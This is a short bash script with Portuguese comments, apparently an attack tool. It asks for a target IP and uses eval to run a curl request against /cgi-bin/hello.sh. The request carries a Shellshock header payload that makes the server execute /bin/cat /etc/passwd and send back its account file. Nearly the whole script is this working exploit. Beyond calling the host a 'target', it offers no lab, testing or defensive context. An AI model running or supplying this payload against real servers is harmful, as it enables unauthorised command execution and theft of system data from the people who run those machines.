#!/bin/bash

echo "Ferramenta simples para preparar um alvo"

# Solicita o IP
read -p "Informe o IP do alvo: " alvo_ip

if [ -z "$alvo_ip" ]; then
    echo "Nenhum IP informado. Encerrando o script."
    exit 1
fi

echo "IP armazenado: $alvo_ip"

# CORREÇÃO: Usando aspas simples para envolver o comando curl
comando_planejado='curl -H "vulneravel: () { :;}; echo \"Content-type: text/html\"; echo; /bin/cat /etc/passwd"'

echo "Irei executar: $comando_planejado http://$alvo_ip/cgi-bin/hello.sh"

# Executando de fato:
eval "$comando_planejado http://$alvo_ip/cgi-bin/hello.sh"